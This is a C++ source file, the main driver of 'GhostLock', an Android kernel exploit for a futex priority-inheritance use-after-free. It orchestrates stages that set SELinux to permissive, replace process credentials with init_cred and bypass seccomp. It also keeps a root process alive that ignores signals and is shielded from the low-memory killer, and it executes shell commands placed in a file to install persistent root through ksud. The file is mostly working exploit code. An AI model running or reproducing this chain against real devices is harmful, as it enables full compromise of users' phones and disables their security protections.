/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 *
 * This translation unit is the thin adapter: parse, run the stage sequence and
 * map the outcome to the process exit code. Setup, attack primitives, victim
 * protocol and stage policy live in their own units under ghostlock::ops,
 * ghostlock::victim, ghostlock::race and ghostlock::stages.
 */

#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>

#include "pipe_daemon.h"
#include "session/exploit_stages.hpp"

using namespace ghostlock;

/* Prototype hook: the pipe-substitution shot, run *before* the stage pipeline.
 * Once selinux_state has been written, the pipeline's own pre-W1 stages bail out
 * (measured: status 0x7f00 every round after the first), which would starve a
 * shot placed inside them.  This is sticky: every round writes a fresh 9-byte
 * window into the daemon's primitive pipe and reads 8 bytes back, so whenever
 * the host plants bufs[i].page between rounds, the next read reports the planted
 * page's content in the serial log. */
static int pipe_shot_only(void) {
    const char *want_s = getenv("GHOSTLOCK_PIPE_SHOT_READ");
    const long want = want_s ? atol(want_s) : 8;
    static const char filler[9] = {'G','L','P','I','P','E','S','L','T'};
    char reply[4096];

    if (pipe_daemon::ensure() != 0) {
        fprintf(stderr, "pipe shot: daemon unavailable\n");
        return 1;
    }
    /* Loop inside this process: the harness only ever executes the freshly
     * staged binary in round 1 (later rounds fall back to a missing path and die
     * with status 0x7f00), and its 20 s watchdog only logs, so this is the one
     * place a guest-side read can be repeated while the host plants between
     * iterations. */
    const long gap = getenv("GHOSTLOCK_PIPE_SHOT_LOOP")
            ? atol(getenv("GHOSTLOCK_PIPE_SHOT_LOOP")) : 8;
    const long armlen = getenv("GHOSTLOCK_PIPE_SHOT_LEN")
            ? atol(getenv("GHOSTLOCK_PIPE_SHOT_LEN")) : 9;
    for (int i = 1;; i++) {
        if (pipe_daemon::request_hex("W", reinterpret_cast<const uint8_t *>(filler),
                                     sizeof(filler), reply, sizeof(reply)) == 0)
            fprintf(stderr, "pipe shot %d: W -> %s", i, reply);
        else
            fprintf(stderr, "pipe shot %d: W failed\n", i);
        pipe_daemon::prim_arm((size_t) armlen, 0);
        if (pipe_daemon::prim_read((size_t) want, reply, sizeof(reply)) == 0)
            fprintf(stderr, "pipe shot %d READ: %s", i, reply);
        else
            fprintf(stderr, "pipe shot %d: read failed\n", i);
        fflush(stderr);
        fflush(stdout);
        if (gap <= 0) break;
        sleep((unsigned) gap);
    }
    return 0;
}

/* Decoupling plan: native executable adapter and W1/W2/W3 orchestration.
 * Inputs: argc/argv plus the process-level session; output: stable exit code.
 * Argument parsing stays here; the stage sequence only owns the session. */
int main(int argc, char **argv) {
    if (getenv("GHOSTLOCK_PIPE_SHOT_ONLY")) return pipe_shot_only();
    const char *profile_path = nullptr;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--profile") == 0 && i + 1 < argc) {
            profile_path = argv[++i];
        } else {
            pr_error("usage: %s --profile <resolved-profile.json>\n", argv[0]);
            return 1;
        }
    }

    ExploitSession &session = g_exploit_session;
    if (stages::run_setup_stage(profile_path) == stages::StageResult::Failed)
        return 1;

    if (runtime_config_snapshot().multicast_phase1_probe) {
        if (!support::kernel5_route_selected()) {
            pr_error("5.x phase-1 probe requested for a non-5.x profile\n");
            return 1;
        }
        pr_info("5.x phase-1 probe: cycle/stamp/adjust/disarm only\n");
        int ok = route::kernel5_resident_start();
        if (ok) route::kernel5_resident_stop();
        pr_info("5.x phase-1 probe result=%s\n", ok ? "pass" : "fail");
        return ok ? 0 : 1;
    }

    switch (stages::run_w1_stage(session)) {
        case stages::StageResult::Failed:
            return 1;
        case stages::StageResult::Done:
            /* Calibration/hand-off: the W1 write leaves the forged PI waiter
             * linked into the waiter thread's task_struct (pi_blocked_on) and
             * into the fake lock's rbtree. Tearing the process down runs the
             * kernel's exit-time PI/futex cleanup over that forged state and
             * wedges the machine (observed twice: W1 reported "SELinux
             * permissive" and exit=0, then the screen froze with adb dead and
             * no panic). Parking here keeps the forged state owned by a live
             * process that never exits, so the permissive SELinux stays usable
             * for an out-of-process follow-up. */
            if (getenv("GHOSTLOCK_PARK_AFTER_W1")) {
                pr_success("parking after W1: forged PI state kept alive "
                           "(pid=%d); do NOT exit/kill this process\n",
                           (int) getpid());
                /* GHOSTLOCK_FINISH: run the *single* cleanup implementation from
                 * here.  This process is root with full caps, so the script can
                 * even insmod kread_min when GHOSTLOCK_LOAD_KO failed, and it
                 * cleans every parked ghostlock (including the earlier uid-2000
                 * W1 process) -- then it kill -9s this process only after every
                 * field reads back clean.  That is what makes the exit safe: the
                 * kernel never gets to walk a forged PI tree.  If the script
                 * returns without killing us, stay parked. */
                const char *fin = getenv("GHOSTLOCK_FINISH");
                if (fin && *fin) {
                    const char *sc = getenv("GHOSTLOCK_FINISH_SH");
                    const char *script = (sc && *sc) ? sc
                            : "/data/local/tmp/gl-w1/cleanup-parked.sh";
                    char cmd[640];
                    (void) snprintf(cmd, sizeof cmd, "/system/bin/sh %s --apply", script);
                    pr_info("FINISH: %s\n", cmd);
                    const int rc = system(cmd);
                    pr_warning("FINISH: script returned rc=%d without cleaning us; "
                               "staying parked -- inspect its output\n", rc);
                }
                /* This process must survive until an out-of-process cleaner has
                 * erased the forged PI links and killed us -- an exit before
                 * that walks the forged tree and wedges the machine.  A stray
                 * SIGTERM (process-group cleanup) or lmkd picking us would be
                 * indistinguishable from that exit, so harden the park:
                 *   1. no parent-death signal (a dying shell must not kill us),
                 *   2. lmkd skips us (the victim child does the same),
                 *   3. every catchable signal is ignored; only SIGKILL can end
                 *      this process, and only after cleanup. */
                prctl(PR_SET_PDEATHSIG, 0);
                const int oom = open("/proc/self/oom_score_adj", O_WRONLY);
                if (oom >= 0) {
                    (void) !write(oom, "-1000", 5);
                    close(oom);
                }
                for (int s = 1; s < NSIG; s++) {
                    if (s != SIGKILL && s != SIGSTOP) (void) signal(s, SIG_IGN);
                }
                /* Command channel: the cleaner cannot run a privileged command
                 * itself (the rshell client keeps bounding set 0x8000c0), so the
                 * receipt may carry a cmd= line; the cleaner drops it into
                 * <home>/parked.d/<pid>.cmd once the forged state is erased, this
                 * loop executes it here -- where CAP_SYS_MODULE still exists --
                 * and the cleaner kills us only after <pid>.done appears.  That
                 * is how /data/adb/ksud late-load (persistent root) is run after
                 * the cleanup but before this process exits.  fork+exec is safe:
                 * copy_process re-inits the child's pi_state_list and
                 * __sched_fork clears pi_waiters/pi_top_task/pi_blocked_on. */
                const char *h = getenv("GHOSTLOCK_HOME");
                char cmdpath[600], donepath[600];
                if (h && *h) {
                    (void) snprintf(cmdpath, sizeof cmdpath, "%s/parked.d/%d.cmd", h, (int) getpid());
                    (void) snprintf(donepath, sizeof donepath, "%s/parked.d/%d.done", h, (int) getpid());
                } else {
                    cmdpath[0] = donepath[0] = '\0';
                }
                for (;;) {
                    if (cmdpath[0]) {
                        const int cf = open(cmdpath, O_RDONLY | O_CLOEXEC);
                        if (cf >= 0) {
                            char buf[512] = {0};
                            const ssize_t n = read(cf, buf, sizeof(buf) - 1);
                            close(cf);
                            (void) unlink(cmdpath);
                            if (n > 0) {
                                pr_info("park cmd: running '%s'\n", buf);
                                const pid_t c = fork();
                                if (c == 0) {
                                    execl("/system/bin/sh", "sh", "-c", buf, (char *) nullptr);
                                    _exit(127);
                                }
                                pr_info("park cmd: child pid=%d\n", (int) c);
                                const int df = open(donepath, O_WRONLY | O_CREAT | O_TRUNC, 0666);
                                if (df >= 0) {
                                    (void) !write(df, "done\n", 5);
                                    close(df);
                                }
                            }
                        }
                    }
                    while (waitpid(-1, nullptr, WNOHANG) > 0) { }
                    usleep(200000);
                }
            }
            return 0;
        case stages::StageResult::Continue:
            break;
    }

    stages::VictimChain chain;
    if (stages::run_w2_w3_chain(session, &chain) ==
            stages::StageResult::Failed)
        return 1;
    return stages::run_handoff_stage(session, chain) ==
                    stages::StageResult::Failed
            ? 1 : 0;
}
